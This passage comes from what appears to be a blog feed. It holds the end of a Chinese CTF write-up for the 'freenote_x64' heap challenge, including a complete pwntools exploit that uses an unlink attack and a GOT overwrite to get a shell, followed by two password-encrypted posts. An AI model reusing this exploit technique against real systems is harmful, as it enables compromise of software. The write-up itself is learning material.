管理块的地址和 libc 基地址<br>将四个 note 全部删除<br>添加一个 note，长度要能包含进最开始的 3 个 note 的 chunk<br> 伪造一个 chunk，大小为 0x80，fd 为 note [0]-0x18， bk 为 note [0]-0x10，利用 unlink 把 NOTE 管理块中 note [0] 的地址改为 note [0]-0x18<br> 把 note [0] 改为 atoi 的 got，然后编辑 note [0]，改为 system 地址<br>输入 /bin/sh，获取 shell</p><p>先申请 4 个 chunk，然后 free (0) 和 free (2)，防止合并；然后在申请 2 个 chunk，只写入 8 字节，就可以 leak 出 heap 和 libc 的基地址；<br> 在 heap 基地址偏移 0x30 的地方有我们需要的 NOTE 管理块的地址</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201132325326.png" alt="image-20220113232517240"></p><h3 id="0x03-exp"><a class="markdownIt-Anchor" href="#0x03-exp">#</a> 0x03 EXP</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./freenote_x64&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;node4.buuoj.cn&#x27;,28735)</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">&#x27;./freenote_x64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">List</span>():</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">cont</span>):</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Length of new note: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(cont)))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter your note: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(cont)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">num,cont</span>):</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Note number: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Length of note: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(cont)))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter your note: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(cont)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">num</span>):</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Note number: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;c&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;d&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;11111111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;22222222&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">List</span>()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;11111111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s=p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">chunk2=u64(s[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">heap_addr=chunk2-<span class="number">0x1940</span></span><br><span class="line"></span><br><span class="line">point_chunk0=heap_addr+<span class="number">0x30</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x90</span>)+p64(<span class="number">0x81</span>)+p64(point_chunk0-<span class="number">0x18</span>)+p64(point_chunk0-<span class="number">0x10</span>) </span><br><span class="line"></span><br><span class="line">payload +=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">payload +=<span class="string">&#x27;c&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x121</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#free_got-&gt;system</span></span><br><span class="line"></span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_got_addr)</span><br><span class="line"></span><br><span class="line">payload2=p64(<span class="number">4</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(free_got_addr)</span><br><span class="line"></span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(chunk2)</span><br><span class="line"></span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload2+=<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x120</span>-<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice: Invalid!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">List</span>()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;2. &#x27;</span>)</span><br><span class="line"></span><br><span class="line">atoi_in_server=u64(p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">system_in_server=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+atoi_in_server-libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3=p64(system_in_server)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201132341535.png" alt="image-20220113234153456"></p><h3 id="0x04-参考文章"><a class="markdownIt-Anchor" href="#0x04-参考文章">#</a> 0x04 参考文章</h3><p><a href="https://blog.csdn.net/weixin_45427676/article/details/105495608">https://blog.csdn.net/weixin_45427676/article/details/105495608</a></p><p><a href="https://www.cnblogs.com/LynneHuan/p/14869403.html">https://www.cnblogs.com/LynneHuan/p/14869403.html</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>To kk</title>
      <link href="/2022/01/02/To%20kk/"/>
      <url>/2022/01/02/To%20kk/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry incorrect password" data-whm="抱歉，信息无法验证">  <script id="hbeData" type="hbeData" data-hmacdigest="ccca89da6777ddbe0c1489f55b8115496c89effeafc10ea68b0a2c12706f9fb5">a6d9ea9da8fc05ccc8d1164b3233fcb96eadc174fe335a7406937ef7072c444d697324cba0e37b9b8446977dff318bb0db8606b3edf6b8d0daa86a2631e54543dbf7440acc018a572a5805e41c0a5aec4e9024ae5c9494b297378fd0133293fec6f8fc387b255223def0e791912688c260471b0946570bb6f261b14a00b094e5ea0523ef7c4b049ef6652ec40e5e53703ba34bffad512cca69fdafbe61f6ae9db60bb0d77fe918acfc319a96214a6c221fa88c0012d7a9f8b6296dbce5c377d800c4c6d93e51fa2e15e8b28d45c26481b410a350aab4b45324f655bf0b638e15095bcbd036fb30406c7bb75c32da536a19cb5150d848fac97f4e24ab1bd165a207553b4f8983eda5e5e25ff6ef22e603b0f602fec1b54e9411d91a299b03eca1d90fe8fff28985965c90b34582265955e2ed38d2cb88f362e9b69ff2734f59ec530b56556232f4b7a26fe4b335d5096d654f8700dc273a74a0124a9eeb6bbfbf20774776ab88f3cdc03aeed95d4a3ede5e343b7aa206c3f08924191a6955f65ef3f7ac9ad32a038870855ca3c7acfa717698093fa35eb0a93a88dc795447ef7282b7560dec5419127d3e1f2230de8805c2b9b5847f6e2712ab1f4e303b5c754a284c972c9c6aad70015f05005cb157c773e8a25eb5877a630facd3857fb00400794702a6feae82fd2499981faf2e0b73d2a3c72989d93f03ddd0a1b85c3a02edb8d2595af4c2c55da9390784bb142ba341ff3fe4ff7041879a50324ce55098ce9be4590eb54348371ce0d216e6c360dcfe0915d03b7c30b96d2a220cad4e03e5d87e657d88111dbfd8c7431be8d704b05db3f97555afe5c34d8fd5cc31c3e171b74a9367ecf20f9653435d1e6d69389db1eae1b5d847d15f3cbb34df3b3ea893e1d8c03cc374ebbb90b2ff30dae7a08255785533da4cf8aa90a70ee4e22017919de0e7ea05e25b7e8e30aa33a72b4d42fa3121b4dd7a79e241e42c8aeac1cd098a75a75b0cbca649d39d03a38d4b67b5bbe9b993cb540f3bf5f4772b69c04a2792fff2f415aceb6bf269d5fabd6814d77894dd70eb8f8bd04e3098214d503ad9c75f54ab1458dde8c1b0e6aba744802b7d9d7ab9e86da0408dc0231f00b744e7c162e139bbca0d12ab6d3cec4cbe97e886477dfd5d9b1846bf8ff7795c30d6ea46d41a68eb05cf8e65feabb9e177becd2b81fade2e26eb88d9338228f76f7e45e8355e9e1bfd6929c4d66594681b0aae60f5a82527043dc5b8a6ecf2975c60528ea683ab8481a720f5d5ac5414cebd97d6d31177f398c4db556e045ffd961d9f6d31db8a71cc0c0fa31ec1f0b7ea5dc4bd7038c55e4287ab6655760e6b2200c6c73c4fe9508555e6b763479b7bcfb0386bdaf8ba20a347d90e1095aa443d20c12a68867eca1d94ca5a5422b317cfab797432fe3186ee76ecf953c638801585f3ae222da1f0232ab4171c8566695d74a4dcc575dfc96769ef870eea1b310844e7b80a626985b7cf503076bbf1eabf8807ed94163702f0327b5e232d4ab96c6d0664738e0b1e9c0a796d4e16c3a29ab3e2c322c10ba4f100fca47eea33e77dae5604ffbcb82c43737ca88a4f574ea9f0709d6d58d1be722243540f50219b7d9db9c38656a69a87a90ef1f68bc545a7f7f8ba7bbb265bb2daf77b65e53d7d9b9e90a273beecddbe2f2776d14871cd2adb8e0c8ee94d6694d29b60a7e529d9a0b2b26d597a42c965910ff06b620cea879251447d78314829c908bb75645f26e4b8a460f291afba15a4b9d6b6771d69c6d9180054844aaf077824e408b19cc66b8c0eaa55077da66d2ee7f5982ce88bfed0e677e20d3799973c7f9dea793f43bdce40bdb8ba96415c2fbf0c324185de0723dd14239b5636464ed93d4374d3840c2c67e1697495c0fff1cbacd5c8de085b08e8e9cc0f925f32b8d6242ae076aa602135e1a1798d7a6fd396b844f4b82b275c6ec9a23791db9e2acca00dce7e80105255b0a337c4ab25b50b101b2761a27cd15a40ad547730bfd23cdb526095c76e0d87a103b8d5256a0038cf48aa6b12b4a0c2afeb8fff007532511d7bb04e8ab721d45ff7e3deab6b4ec1990162d35babfd605b17a4b90f4f413e68bd0e72a184c36147bbb127c1a2932664a5a09cad7cbeee6d7d181813702b1665daa9de7662ad9a504a7ecea6333a53d152f18b8ededb4e6bfa8914d2c58cd69dad17bf3e88182c3cc9785ae706e68f2775e3b0f95bf4a56a1bd7ea02e06c2b22072faf82bd34ab0f08470737d7a5adbc6e5360799e165e378c0ff8921761e1e0101b88aa9ff2af0b623b465ea082ad9dcd134737005fceb63d352927d7b6f4f253b9ac3b41e82842464f4bda5751ac90494b2decd2f97c7df2c1e29b1f5d8668913a3d1b9b8775a04d5d3a81a2bf9b9ee5a758f06196759b1385d03831df3cc834d25001fc66f9a36cd9c89bbe4dd2954c42a69281182f71d574f3f29ba9b68f6905b63a0a1505315528582738b20c4627c056a59a4f74d8bb15785abbab589d9da4305d103f5dbb45cc7ece3f043b872490f9e0130a01d5015c090dd72c96971b422c4ba85443bd28449b8d5f3f526a2cb40b83d86f905296327b387e89635d7e1fd9ac75914520965d1d3f26b99d47a5913c054391a9652bb3d27db0666ec2ddd1be66e5274ae05ea37b315080ce921cf962b9d8419bde60dcabcf84608ff14db390a383ec8364dfcbff6b7da98797805f8540f4935d3e1d7e149cf3fc46f6b0d4f7ef7529570394343d527ae1591af2b704cf8d4368af95249f7c453df1e7a7a8aa1857a1aff0565870c3f74eed05026a9cd6d4e567ab0f547e23cb2fee7dcb3da11507f978</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Pease input your password</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Diaries</title>
      <link href="/2021/12/26/diary/"/>
      <url>/2021/12/26/diary/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry incorrect password" data-whm="抱歉，信息无法验证">  <script id="hbeData" type="hbeData" data-hmacdigest="b7ec9bc5089164fa7c734e7e50c4ab309cae437383ff6be790dc1ea7517b8213">b6564b1d950e205446a5f2eabbefe8866c8c0c9144c3793e12be10a85944a02bc4de03a4c0bde1397987ad05a5904d00274cb29ed724545b94f9d252ea8414ebd4c44790d5faa95bda27c4ac90b3dbe7fbb3dc3e9882a5f3788bd09af293d89ce166e6838a4b09bdfd97f5b6e0c4002f908093c097f3d51787bdbcbb938f3be4e771d94ae9a8fec6a51592e1f71b753d4337ea00ae8cf9f9a437538cedccc4b90523d5c600e5f8e85d09826563eacea409070077698a537f91cf5e25c803f8d304b554b985ec3a8eb9cab7a78fc569af2427a5599a212432783d590ddad71c3f7cebb4b7a4c60ba19d947fcc75e7634e5506f9c2f27afaab094be16c44561eb4c3a8ab7ecebee25aa05ba16860089245095a5695821bfb6f0fe5e4ae38a9830115a6e7bc8750f4825607a40402666b8bf21f4f9b29818783f05a5cd6a594d4ce0f13a29380d14159b338b22603ee52b7f001ef02290c84de26412cb86d3630385523881be8bc75d8232079724d144186b3659b760055e3fa0d6de41fc1ce75610e204440f7de2cbdc6483ad80cbc5dfdfd2b1592d9f274d17922198d7a23cce2f515265f694f189808f55992542c25946fc8218411bb70be40036c8a817578ab4f80bd5f21b9a94820b7e1773dce4b325f9e077e96464d97ab9bb62ebc4fded6281cd7fc5feb0cfe0782b71b393c6888d253f8cf7a00617e523f7928f6c5a79718bc056c26f919546ac7a5c06a0734127a2e713eaa105fb636739670fd02947c98ad78302f48609611e08e0aa166d6c3e3454363107812b06c09af3819ed1689b2f33812fbefa318dcd88d0c88832e2b60452d633dda37662e2cca1d2d4279dcb7aea4153a2470981d2a20fb959bd36e21a138b88a83e95f1f39919fe5b021da3a5b5b063a2afd24d1dee68bd965ed808c68bc93f6b5ee38df7471321d9ba698e1708eb7bba78a4e05e32ab8c4e0946c226dfda777d0ad5181c4da3da208b5b9aa06f8ee9ca6218340d7894804ba03a7cc4499f749335a8098cb402b5dee833e85ff14f0d7448cce7563f570c7ccf7a415573575d36bc64b5156e97b4682019f1b3b58d9cc0b9505bc77722f22c6632111d0a215c4ed593de3766b36d08fe3c255c52cdb9f6447a0e8cf819c4f15ac2885547eee05ad29506717bb75c39ed1a4a45cb1ac62eb14a37690e07fc092313f4f68cb44172d9f4cd6ef09173ff12e51fece93b7befa8a0d8b17a6409af12701de2642f366c007c7984bca9951527243716530c5470fc5dde6c2c45621c1f585b718496a1b458668d57d3d960473acf363b96e2a4e0e37a78974b55f3b4fd7dc62857e0e304d1b4d40a4fe587022972cff7ab1ed797d2d5f2c70406aa09ea8b8d4fa5f5f4ccc2d1174ac0f08a9468d26fd476cab0c5c2b88879ad9057bae9e00d274898d59639242a113108a779355d9a7b19757927f25e042ad98b942023e300116d2728250a2dfd0c170075e1ae019ea2f7460fed77bf6d3f24c81a60269151ccfe598f53d2e782e6c03c34cf4bebab578780a7d5dd19345f0623449743683174fd83678e7fe68105c150365ffb9b7ed800cadc25b1913a637f324ac9eb44c45b5c63189d2bab7f04dc1d62cc82cfa309ea0c52121fc8d2eb1df229c45ae164d68cf4a31f8d75deb59bc1c8275bd286bc04c5204f2725b6a33ae24bad7e0eedd5888047c5ea13064c90bd8f034421825fce9a28d07af37af6e59409c6ba833a2598f9804d3a0de1ed7d5c40ad40600e7ccced00215280592ce5b9ee50eef04dac198c1c8c6db37e094edecf0175a28b461de4c7a748e8185408dfa238e02930faf9e213ccc59a3d4f9d6c0c3e90ff887c8cfa117394ccfedd272233e491d9d2c1183c82a65ae923c2acb42af36920e51395bd557972865d575136849d08660f59c10166910a2bffc63fe2497c013aa873aa2bd5dcdadd45f8fcb95cd233d34f4d85d61fd50e142a9aa076298ab37be471de9786cb089ac53f825843fecf95640c3cbd189cbddf2089ec3909cca18bd65ea7a9c1cfe926a9dbb03dd530eb8f602ccc7f3dfd49cceb743c4b692bb0a157ecc67920d60f17913c1395a8935ad6ea3237170d4fb1689126376a85bbc2681d99916a59a15e8c52dca5eb579cb5cb8da4581a3319d463c6cdbeeba92390a7e99634e84d7d54298683941c97c2559bf77055fed6ab67c61b6b9dc44eee905a4c577fcd4d2aae087dec024441ec0ed8dc89bedbb88d5c1bdafbf07e281c1f1ccfc60e884773c7e8b82d214b445bf0e01daa29112ec2af26833bad24ff94e796a00d9b218173bafe845198d02355cf0c9fbba1bff0dffd19abc6e214fb4d89e9fcdd7e72d1900a2fb8277ca3134577522385e199f8a08fe3c42525225a62ef8159fe5a5a3bc763d4a7eb347d1959988d21be181f1c9a722df439618288e36bfab320b1598c0c41d796e51faabd2cbf0f355c3ade511cd0c92f8bb4e81aa6d6e5ff11cbeb8461f4c044b06d259df94433052f4a2e1ca4a2b1d522985cf9c0a8abbd2ada2317ae976357661ae06c692cebf4305326be49dc3e81718e1ddc487a7c74420b8e0c77c92027e48bd7fc2aa94980733109029ffab6f8cd52d5eb037bba7fd172567701609ea176bf76eee46973c2d27835c5a93e9421bd21b5da7d566b70bef0fdb394b9f765e265727ea8fdf093a90f4eb66bc5f11e38b979424e85af1140b76178a0a91191dd74f5a79da9b45db67c0d7172b0a2bdc4729eba387e7fe03392623c91ce0c7731fabf79ec43795ca48683fe2200d74e1a694fc1a24f546d161641ff5188d54d96599c9e0597f54c5665d7f1ae203d5bf00e6ed6f63f7e288c831cf8639e7ff240ced5a94a7a57603706eac65b1cb00336ab34ff3e34260da25dee3359a90efa9fe158b0cd2e1aa9bafb7077e78293ec81b2bda620c95ba7897b4775e438f19648be41f446880b3d686d48d59734e534622c896554a3dbf0f9cf062f5c24d3556a91cce20fdd593af182e95b64ea2e11ea481f87364ff8597f355c84234507bb414493fd54b9d502ea2689258787ef0b04f15200ff0342fd9cf1805700e544d3fb3dd254416ccc8994ae177c16205e9e25b0d9d945558ba54906b415c291c2a50a245716d6a17a90123de110eae595c274f730a320fc026d6112337fd0bf460d6f9840333734bf6e7d319210f8d76a517f656e1cd28ba0d8bff011ed4dcf8301bc8ddf7d14d89edd74d064dd1a5feaed9244fbfe036808370698cce6f935093e3ccabb67f2238d30a6506321d6c00b77a31f64e9f702f06304aecbf0d02afeff20c2c427c3c62fb83f511f0a5e662639562ef90d7755fda30f49fe31c51e0ef29b4f5ca31329823037ec5c27a7e587cf594f97c370c8fc2f085315662e2befd48e8d259177d9877c11f8c5d7a2e653ab32199b00aa144c8574316bc0f496c7680f45d1e07c0bd2a6ced1ac03d3e8cb875491af60acf2d8087159990b6d034c4de846f7ed366a930fc0379ed84fd5621c6b648330c0c5c1ba9e1d8c922a2e8d95d987faf92bb53e0e0859740fea25c7c8aef6236978f442d14d16f118966ee4d3028272a4ece72747b7ad250f527a9078a2e282e2661471d2ed8dcdd0f3c8adf5bf09bbd371399b846cfb42017f1d87e87f25035d0970bc80451ead46111dfa89ca3930dcb998653dcec823ad80d7983b46f53a1a64be3c5a0e49ab1fe564b1937170890c54128bfe5c3dc98b22a7307c6d8ced9551b9aa4b867d658ed9f293e4f747287c28dd28adf53b6095c3b9b725660eca83a06bd17e2f1083bccf68c98d62a6e96a3b9008d6d1e7f2aeeb990f55700bb4e665e81c3018177ed2b3b206054ab5ee7097a014eea3442f99ee415ecf657b775b9cef7c928a5b5b89ad077fc452d0ec17ed90f07ced540e924f21867438a69e67b0018f317f9ca23a5b4f4359ff1a0beaf3e6865bfee9cbe74ce4cb6e82f2c868390b2a8a5c46e77a1d4ac8bff36c02ffddecb57d3538c0f01c6d5fa3d70c8fe51cd4c41642543f35e4c65cae900e89b8fa55c431e3b130f7265d25d1edace248fc87299290a69bffd56bea9d6d9d7c52a7a3aa14850d5ea6ce5e47171d9153305e6c11765cb5c4e5b92e7dae2766ae1c976f632cb5a0090f32012cd7146ed8212aeea8dd7d658b55d331d7b983cae9ce5fa5f77a226b1ad17249666da7f24cbeae7addf38ed8c488aa4d175cda5354b179c5354d96ae33fe2cde62f500302936abb458e1fceeb89c74bce9b908286bc4050ea4b20635ffdd911a2a7c1ae671cd79be65e530ebccd0f29a4c86a0aa752a0215cd159ea8aac4e52dbd428dd7b5d7f5c5dfbc2c6ce1a581647f88643365f5dad26f69fca59d3f55d0ec2e6619ff06e4a5167a9e32877b83ccd84f5e690770b684b366b13268828844d70cf490cfa4e1dd6ded66fde48cc5abb6ba57011369b55ce1c18b7e2725e9cec2fe766c569afa1d9cbc74d8d8c41863d8b63cf7410b269ac9725b23e946de3268ebc630d18f25e1dd8b3601274691c4a56a5d4c7016c7c23df5cc5ae6bc1e545b574d14b0a766cdddde6c2e8c5f3b1efc75374fd6dcd4a403074d887c9129d4a523feb742c944ad1cb5ca4f5481e409ca2a6da397503d1972858413cea084dcd29fcdbf22370e401f9e91de9ef4e2a733c1c91a2f673b04ff139e74163e717f7aad4e0e2600170900614cab5c908b35cda40eadcef4839baa9dbf61d04e37b6a0cf5367679f7dfcf9f7240bae2654a55ec608dc26f7d49fc277a2f3491b313bf4159b1b45746a91cf9f603e2208084db2da55e49aaa68c8288aa605da77d8e541f4a599f69e12a626e18fabbf18b23151a6bdb20058e8cff469df0aef372dc1192fce3d8dfa629fe69f89178511a400ba9847f242a8e9f6bfcdd5880ee1abd38be5f26d211365102afb3a5fdfc7efeea77123b4361debc38ccd7da3796f3293f7c9caca3d21a53e33ca5d85a64b159cf8d42a48e3d9845ab89b57d41c883f7d0333b15647b3429f75057a34dd9c04fd38092c028dbd028abbb31f1cf00d313bba589d37cace30277a317491b915e521a6cafb414b46f7fcf848ae2a57268f258ff7b7bbce21b60c117aa9191ab